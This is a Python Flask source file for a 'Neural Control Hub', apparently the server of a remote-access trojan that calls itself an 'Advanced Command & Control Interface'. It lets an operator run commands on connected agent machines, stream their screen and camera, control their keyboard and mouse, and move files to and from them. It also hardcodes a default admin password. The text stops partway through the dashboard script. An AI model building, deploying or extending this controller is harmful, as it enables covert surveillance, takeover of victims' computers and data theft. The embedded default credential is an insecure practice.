#final controller
import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash, render_template_string, render_template
from flask_socketio import SocketIO, emit, join_room, leave_room
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import os
import base64

# Configuration Management
class Config:
    """Configuration class for Neural Control Hub"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Sphinx_Super_Admin_19')
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
socketio = SocketIO(app, async_mode='eventlet')

# Security Configuration and Password Management
def generate_salt():
    """Generate a cryptographically secure salt"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """
    Hash a password using PBKDF2 with SHA-256
    
    Args:
        password (str): The password to hash
        salt (bytes, optional): Salt to use. If None, generates a new salt
    
    Returns:
        tuple: (hashed_password, salt) where both are base64 encoded strings
    """
    if salt is None:
        salt = generate_salt()
    elif isinstance(salt, str):
        salt = base64.b64decode(salt)
    
    # Use PBKDF2 with SHA-256 for secure password hashing
    import hashlib
    import hmac
    
    # Create the hash using PBKDF2
    hash_obj = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    # Return base64 encoded hash and salt
    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')

def verify_password(password, stored_hash, stored_salt):
    """
    Verify a password against a stored hash and salt
    
    Args:
        password (str): The password to verify
        stored_hash (str): The stored hash (base64 encoded)
        stored_salt (str): The stored salt (base64 encoded)
    
    Returns:
        bool: True if password matches, False otherwise
    """
    try:
        # Hash the provided password with the stored salt
        hash_obj, _ = hash_password(password, stored_salt)
        return hmac.compare_digest(hash_obj, stored_hash)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """
    Create a secure hash for a password
    
    Args:
        password (str): The password to hash
    
    Returns:
        tuple: (hash, salt) both base64 encoded
    """
    return hash_password(password)

# Generate secure hash for admin password
ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)

# Session management and security tracking
LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP

def is_authenticated():
    """Check if user is authenticated and session is valid"""
    print(f"Session check - authenticated: {session.get('authenticated', False)}")
    print(f"Session contents: {dict(session)}")
    
    if not session.get('authenticated', False):
        print("Not authenticated - returning False")
        return False
    
    # Check session timeout
    login_time = session.get('login_time')
    if login_time:
        try:
            # Handle both formats: with and without 'Z'
            if login_time.endswith('Z'):
                login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
            else:
                login_datetime = datetime.datetime.fromisoformat(login_time)
                # Assume UTC if no timezone info
                if login_datetime.tzinfo is None:
                    login_datetime = login_datetime.replace(tzinfo=datetime.timezone.utc)
            
            current_time = datetime.datetime.now(datetime.timezone.utc)
            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
                print("Session timeout - clearing session")
                session.clear()
                return False
        except Exception as e:
            print(f"Session authentication error: {e}")
            session.clear()
            return False
    
    print("Authentication successful - returning True")
    return True

def is_ip_blocked(ip):
    """Check if IP is blocked due to too many failed login attempts"""
    if ip in LOGIN_ATTEMPTS:
        attempts, last_attempt = LOGIN_ATTEMPTS[ip]
        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
            # Check if lockout period has passed
            if (datetime.datetime.now() - last_attempt).total_seconds() < Config.LOGIN_TIMEOUT:
                return True
            else:
                # Reset attempts after timeout
                del LOGIN_ATTEMPTS[ip]
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    if ip in LOGIN_ATTEMPTS:
        attempts, _ = LOGIN_ATTEMPTS[ip]
        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
    else:
        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP after successful login"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication for routes"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    client_ip = request.remote_addr
    
    # Check if IP is blocked
    if is_ip_blocked(client_ip):
        remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
        return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Neural Control Hub - Login Blocked</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --accent-red: #ff4757;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                text-align: center;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 20px;
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: var(--accent-red);
                border: 1px solid var(--accent-red);
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>NEURAL CONTROL HUB</h1>
            </div>
            
            <div class="error-message">
                <h3>🔒 Access Temporarily Blocked</h3>
                <p>Too many failed login attempts detected.</p>
                <p>Please wait before trying again.</p>
            </div>
            
            <a href="/login" class="retry-btn">Try Again</a>
        </div>
    </body>
    </html>
    ''')
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        # Verify password using secure hash comparison
        if verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            # Successful login
            clear_login_attempts(client_ip)
            session['authenticated'] = True
            session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            session['login_ip'] = client_ip
            return redirect(url_for('dashboard'))
        else:
            # Failed login
            record_failed_login(client_ip)
            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
            
            if remaining_attempts > 0:
                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
            else:
                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
    
    # Return login template as string since templates folder may not be available on Render
    login_template = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Neural Control Hub - Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 10px;
            }
            
            .login-header p {
                color: var(--text-secondary);
                font-size: 0.9rem;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: var(--text-secondary);
                font-weight: 500;
            }
            
            .form-group input {
                width: 100%;
                background: var(--secondary-bg);
                border: 1px solid var(--glass-border);
                border-radius: 8px;
                padding: 12px 16px;
                color: var(--text-primary);
                font-size: 1rem;
                transition: all 0.3s ease;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: var(--accent-blue);
                box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
            }
            
            .login-btn {
                width: 100%;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px;
                color: white;
                font-weight: 600;
                font-size: 1rem;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: #ff4757;
                border: 1px solid #ff4757;
                border-radius: 8px;
                padding: 12px;
                margin-bottom: 20px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>NEURAL CONTROL HUB</h1>
                <p>Admin Authentication Required</p>
            </div>
            
            {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for category, message in messages %}
                        <div class="error-message">{{ message }}</div>
                    {% endfor %}
                {% endif %}
            {% endwith %}
            
            <form method="POST">
                <div class="form-group">
                    <label for="password">Admin Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Access Dashboard</button>
            </form>
        </div>
    </body>
    </html>
    '''
    return render_template_string(login_template)

# Logout route
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Configuration status endpoint (for debugging)
@app.route('/config-status')
@require_auth
def config_status():
    """Display current configuration status (for debugging)"""
    return jsonify({
        'admin_password_set': bool(Config.ADMIN_PASSWORD),
        'admin_password_length': len(Config.ADMIN_PASSWORD),
        'secret_key_set': bool(Config.SECRET_KEY),
        'host': Config.HOST,
        'port': Config.PORT,
        'session_timeout': Config.SESSION_TIMEOUT,
        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
        'login_timeout': Config.LOGIN_TIMEOUT,
        'current_login_attempts': len(LOGIN_ATTEMPTS),
        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
        'password_hash_algorithm': 'PBKDF2-SHA256',
        'hash_iterations': Config.HASH_ITERATIONS,
        'salt_length': Config.SALT_LENGTH
    })

# Password change endpoint
@app.route('/change-password', methods=['POST'])
@require_auth
def change_password():
    """Change the admin password"""
    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
    
    try:
        data = request.get_json()
        current_password = data.get('current_password', '')
        new_password = data.get('new_password', '')
        
        # Verify current password
        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
        
        # Validate new password
        if len(new_password) < 8:
            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
        
        # Generate new hash for the new password
        new_hash, new_salt = create_secure_password_hash(new_password)
        ADMIN_PASSWORD_HASH = new_hash
        ADMIN_PASSWORD_SALT = new_salt
        
        # Update the config (this will persist for the current session)
        Config.ADMIN_PASSWORD = new_password
        
        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500

# --- Web Dashboard HTML (with Socket.IO) ---
DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Control Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <style>
        :root {
            --primary-bg: #0a0a0f;
            --secondary-bg: #1a1a2e;
            --tertiary-bg: #16213e;
            --accent-blue: #00d4ff;
            --accent-purple: #6c5ce7;
            --accent-green: #00ff88;
            --accent-red: #ff4757;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --border-color: #2d3748;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .neural-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(108, 92, 231, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.05) 0%, transparent 50%);
            z-index: -1;
        }

        .top-bar {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--glass-border);
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .top-bar-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px 0;
        }

        .header h1 {
            font-family: 'Orbitron', monospace;
            font-size: 2.5rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
        }

        .header .subtitle {
            font-size: 1rem;
            color: var(--text-secondary);
            font-weight: 300;
        }

        .logout-btn {
            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
            border: none;
            border-radius: 8px;
            padding: 8px 16px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .logout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 71, 87, 0.3);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 25px;
            margin-bottom: 25px;
        }

        .panel {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }

        .panel:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4);
        }

        .panel-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .panel-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .panel-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            font-weight: 700;
            color: var(--text-primary);
        }

        .agent-grid {
            display: grid;
            gap: 12px;
            max-height: 400px;
            overflow-y: auto;
        }

        .agent-card {
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .agent-card:hover {
            border-color: var(--accent-blue);
            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.2);
        }

        .agent-card.selected {
            border-color: var(--accent-green);
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
        }

        .agent-status {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 10px var(--accent-green);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .agent-id {
            font-family: 'Orbitron', monospace;
            font-weight: 600;
            color: var(--accent-blue);
            margin-bottom: 5px;
        }

        .agent-info {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .control-section {
            display: grid;
            gap: 16px;
        }

        .control-group {
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 16px;
            transition: all 0.3s ease;
        }

        .control-group:hover {
            border-color: var(--accent-blue);
            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.1);
        }

        .control-header {
            font-family: 'Orbitron', monospace;
            font-size: 1rem;
            font-weight: 600;
            color: var(--accent-blue);
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .neural-input {
            width: 100%;
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px 16px;
            color: var(--text-primary);
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }

        .neural-input:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
        }

        .neural-input[readonly] {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-secondary);
        }

        .btn {
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-danger {
            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
        }

        .btn-success {
            background: linear-gradient(45deg, var(--accent-green), #2ed573);
        }

        .output-terminal {
            background: #000;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            color: var(--accent-green);
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            position: relative;
            line-height: 1.4;
            font-size: 14px;
        }

        .output-terminal::before {
            content: "NEURAL_TERMINAL_v2.1 > ";
            color: var(--accent-blue);
            font-weight: bold;
        }

        .terminal-prompt {
            color: var(--accent-blue);
            font-weight: bold;
        }

        .terminal-output {
            color: var(--accent-green);
            margin: 5px 0;
        }

        .terminal-error {
            color: var(--accent-red);
            margin: 5px 0;
        }

        .status-indicator {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-top: 10px;
            display: none;
        }

        .status-success {
            background: rgba(0, 255, 136, 0.2);
            color: var(--accent-green);
            border: 1px solid var(--accent-green);
        }

        .status-error {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .config-status {
            display: grid;
            gap: 12px;
        }

        .config-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid var(--border-color);
        }

        .config-item:last-child {
            border-bottom: none;
        }

        .config-label {
            font-weight: 500;
            color: var(--text-secondary);
        }

        .config-value {
            font-family: 'Orbitron', monospace;
            color: var(--accent-blue);
            font-size: 0.9rem;
        }

        .password-management {
            display: grid;
            gap: 16px;
        }

        .password-strength {
            margin-top: 8px;
            padding: 8px;
            border-radius: 4px;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .password-weak {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .password-medium {
            background: rgba(255, 193, 7, 0.2);
            color: #ffc107;
            border: 1px solid #ffc107;
        }

        .password-strong {
            background: rgba(0, 255, 136, 0.2);
            color: var(--accent-green);
            border: 1px solid var(--accent-green);
        }

        .no-agents {
            text-align: center;
            padding: 40px 20px;
            color: var(--text-secondary);
        }

        .no-agents-icon {
            font-size: 3rem;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--primary-bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--accent-blue);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-purple);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .top-bar-content {
                flex-direction: column;
                gap: 15px;
            }
            
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="neural-bg"></div>
    
    <div class="top-bar">
        <div class="top-bar-content">
            <div class="header">
                <h1>NEURAL CONTROL HUB</h1>
                <p class="subtitle">Advanced Command & Control Interface</p>
            </div>
            <a href="/logout" class="logout-btn">Logout</a>
        </div>
    </div>
    
    <div class="container">
        <div class="main-grid">
            <!-- Agents Panel -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-icon">🔗</div>
                    <div class="panel-title">Active Agents</div>
                </div>
                <div class="agent-grid" id="agent-list">
                    <div class="no-agents">
                        <div class="no-agents-icon">🤖</div>
                        <div>No agents connected</div>
                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
                    </div>
                </div>
            </div>

            <!-- Control Panel -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-icon">⚡</div>
                    <div class="panel-title">Command Interface</div>
                </div>
                
                <div class="control-section">
                    <div class="control-group">
                        <div class="control-header">Target Selection</div>
                        <div class="input-group">
                            <label class="input-label">Selected Agent</label>
                            <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent from the left panel">
                        </div>
                    </div>

                    <div class="control-group">
                        <div class="control-header">Command Execution</div>
                        <div class="input-group">
                            <label class="input-label">Command</label>
                            <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
                        </div>
                        <button class="btn" onclick="issueCommand()">Execute Command</button>
                        <button class="btn btn-danger" onclick="clearTerminal()">Clear Terminal</button>
                        <div id="command-status" class="status-indicator"></div>
                    </div>

                    <div class="control-group">
                        <div class="control-header">Quick Actions</div>
                        <button class="btn" onclick="listProcesses()">List Processes</button>
                        <button class="btn" onclick="showCurrentDirectory()">Show Directory</button>
                        <button class="btn" onclick="startScreenStream()">Screen Stream</button>
                        <button class="btn" onclick="startCameraStream()">Camera Stream</button>
                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                    </div>

                    <div class="control-group">
                        <div class="control-header">Live Keyboard</div>
                        <div class="input-group">
                            <label class="input-label">Press keys here to control the agent directly</label>
                            <div id="live-keyboard-input" tabindex="0" class="neural-input" style="height: 100px; overflow-y: auto;" placeholder="Click here and start typing..."></div>
                        </div>
                    </div>
                     <div class="control-group">
                        <div class="control-header">Live Mouse Control</div>
                        <div class="input-group">
                            <label class="input-label">Control the agent's mouse here</label>
                            <div id="live-mouse-area" style="width: 300px; height: 200px; border: 1px solid #ccc; position: relative; background: #222;"></div>
                        </div>
                        <div class="input-group">
                            <label class="input-label">Mouse Button</label>
                            <select id="mouse-button" class="neural-input">
                                <option value="left">Left</option>
                                <option value="right">Right</option>
                            </select>
                        </div>
                    </div>

                    <div class="control-group">
                        <div class="control-header">File Transfer</div>
                        <div class="input-group">
                            <label class="input-label">Upload File to Agent</label>
                            <input type="file" id="upload-file" class="neural-input">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Agent Destination Path (e.g., C:\Users\Public\file.txt)</label>
                            <input type="text" id="agent-upload-path" class="neural-input" placeholder="Enter full path on agent...">
                        </div>
                        <button class="btn" onclick="uploadFile()">Upload</button>
                        <div class="input-group" style="margin-top: 15px;">
                            <label class="input-label">Download File from Agent</label>
                            <input type="text" id="download-filename" class="neural-input" placeholder="Enter filename on agent...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Save to Local Path (e.g., C:\Users\YourName\Downloads\file.txt)</label>
                            <input type="text" id="local-download-path" class="neural-input" placeholder="Enter local path to save (e.g., C:\\Users\\YourName\\Downloads\\file.txt)">
                        </div>
                        <button class="btn" onclick="downloadFile()">Download</button>
                        <div id="file-transfer-status" class="status-indicator"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Output Terminal -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-icon">💻</div>
                <div class="panel-title">Neural Terminal</div>
            </div>
            <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
        </div>

        <!-- Configuration Status -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-icon">⚙️</div>
                <div class="panel-title">System Configuration</div>
            </div>
            <div class="config-status" id="config-status">
                <div class="config-item">
                    <span class="config-label">Admin Password:</span>
                    <span class="config-value" id="admin-password-status">Checking...</span>
                </div>
                <div class="config-item">
                    <span class="config-label">Hash Algorithm:</span>
                    <span class="config-value" id="hash-algorithm">Checking...</span>
                </div>
                <div class="config-item">
                    <span class="config-label">Session Timeout:</span>
                    <span class="config-value" id="session-timeout">Checking...</span>
                </div>
                <div class="config-item">
                    <span class="config-label">Max Login Attempts:</span>
                    <span class="config-value" id="max-login-attempts">Checking...</span>
                </div>
                <div class="config-item">
                    <span class="config-label">Blocked IPs:</span>
                    <span class="config-value" id="blocked-ips">Checking...</span>
                </div>
                <button class="btn" onclick="refreshConfigStatus()">Refresh Status</button>
            </div>
        </div>

        <!-- Password Management -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-icon">🔐</div>
                <div class="panel-title">Password Management</div>
            </div>
            <div class="password-management">
                <div class="control-group">
                    <div class="control-header">Change Admin Password</div>
                    <div class="input-group">
                        <label class="input-label">Current Password</label>
                        <input type="password" class="neural-input" id="current-password" placeholder="Enter current password">
                    </div>
                    <div class="input-group">
                        <label class="input-label">New Password</label>
                        <input type="password" class="neural-input" id="new-password" placeholder="Enter new password (min 8 chars)">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Confirm New Password</label>
                        <input type="password" class="neural-input" id="confirm-password" placeholder="Confirm new password">
                    </div>
                    <button class="btn" onclick="changePassword()">Change Password</button>
                    <div id="password-change-status" class="status-indicator"></div>
                </div>
            </div>
        </div>

        <!-- Hidden audio player for streams -->
        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
    </div>

    <script>
        const socket = io();
        let selectedAgentId = null;
        let videoWindow = null;
        let cameraWindow = null;
        let audioPlayer = null;

        // --- Agent Management ---
        function selectAgent(element, agentId) {
            if (selectedAgentId === agentId) return;

            // Clean up previous agent's state
            if (selectedAgentId) {
                stopAllStreams(); // Stop streams for the old agent
            }

            selectedAgentId = agentId;
            document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
            element.classList.add('selected');
